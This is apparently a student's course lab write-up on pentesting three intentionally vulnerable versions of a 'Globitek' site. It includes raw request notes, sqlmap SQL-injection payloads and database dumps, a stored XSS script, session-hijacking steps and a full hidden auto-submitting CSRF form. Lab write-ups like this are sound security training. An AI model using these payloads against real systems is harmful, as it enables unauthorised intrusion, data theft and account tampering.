# FacebookCyberSecurityCourseWeek8

POST /blue/public/staff/login.php 
csrf_token=d3115608c3c3aeb6cb8292b53c3b5899&username=&password=&submit=Submit

GET /blue/public/salesperson.php?id=1

-----

GET /green/public/salesperson.php?id=1

POST /green/public/contact.php HTTP/1.1
Cookie: PHPSESSID=qfsftu2c1q8njfubig8vrvfgl7

csrf_token=74905c37cf6cd71f632761b7c70a473c&name=aaaa&email=aaaa%40aol.com&feedback=aaaa&submit=Submit

 Admin red:
 POST /red/public/staff/users/new.php HTTP/1.1
 csrf_token=9823e079f451ca389ef312842a45671b&first_name=Jon&last_name=k&username=ok&email=ok%40aol.com&password=%21QAZ%40WSX1qaz2wsx&confirm_password=%21QAZ%40WSX1qaz2wsx&submit=Create

    GET /red/public/staff/users/edit.php?id=4 HTTP/1.1

    GET /red/public/staff/users/show.php?id=4 HTTP/1.1

    GET /red/public/staff/salespeople/show.php?id=10 HTTP/1.1

    GET /red/public/staff/salespeople/edit.php?id=11 HTTP/1.1

    GET /red/public/staff/countries/show.php?id=1 HTTP/1.1
















# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQLi

Blue site vulnerable to SQLi. Using sqlmap utility, with endpoint "/blue/public/salesperson.php?id=1", results:
sqlmap identified the following injection point(s) with a total of 205 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4778=4778 AND 'jfPB'='jfPB

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (comment)
    Payload: id=1' OR SLEEP(5)#
---

After inject point was found, DB tables and sensitive data was exposed from all 3 of the sites (red/blue/green):

web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
available databases [7]:
[*] globitek_blue
[*] globitek_green
[*] globitek_red
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

For instance, using sqlmap to probe globitek_blue tables, we find:

Database: globitek_blue
[8 tables]
+-------------------------+
| countries               |
| failed_logins           |
| feedback                |
| salespeople             |
| salespeople_territories |
| states                  |
| territories             |
| users                   |
+-------------------------+

GIF:
Insert 5.

Vulnerability #2: Session Hijacking / Fixation
Blue site allows sessions to be a year old, and never regenerates the session ID, even when the user agent string changes. This makes it vulnerable to both session hijacking and session fixation attacks.  This is demonstrated by opening two browser instances. In the first, we will log in as an admin. We will then discover the session id using the provided tool, and give and set it to browser 2. With this id, browser 2 can bypass the login process. Uh-oh!

GIF:




## Green

Vulnerability #1: Cross-site Scripting
    Green site is vulnerable to stored XSS attacks. Any user can submit feedback to the admin of the site, and the feedback is not properly sanitized.
    Submitting a form with comment <script>alert('XSS attack');</script>, we can demonstrate the effect when the admin views it (seen below):
GIF: 6
Vulnerability #2: __________________


## Red

Vulnerability #1: Cross Site Request Forgery

    The red site doesn't need a CSRF token to carry out admin-level work, such as editing a user's profile. By creating a hidden form that is automatically submitted (without notifying the user of submission results), we can be stealthy. For example, by using a hidden form which will not display submission results, we can send a POST request by linking it to a logged in admin. In this example, I've linked the malicious form to the admin through the "contact us" page.
    ```
    <html><body onload="document.bank_form.submit()"><form action="https://35.184.242.122/red/public/staff/users/edit.php?id=4" method="POST" name="bank_form" style="display: none;" target="hidden_results" ><input type="text" name="first_name" value="MALICIOUSALTEREDVALUE"/><input type="text"/></form> <iframe name="hidden_results" style="display: none;"></iframe> </body> </html>
    ```

GIF: 8

Vulnerability #2: Username Enumeration

    The red site is vulnerable to username enumeration, because attempting to login too many times will lock out the account from trying for x minutes. This is prompt confirms that the username exists in the system (accounts that do not exist will not throw this error message after 3 attempts)


GIF: 7


## Notes

Describe any challenges encountered while doing the work
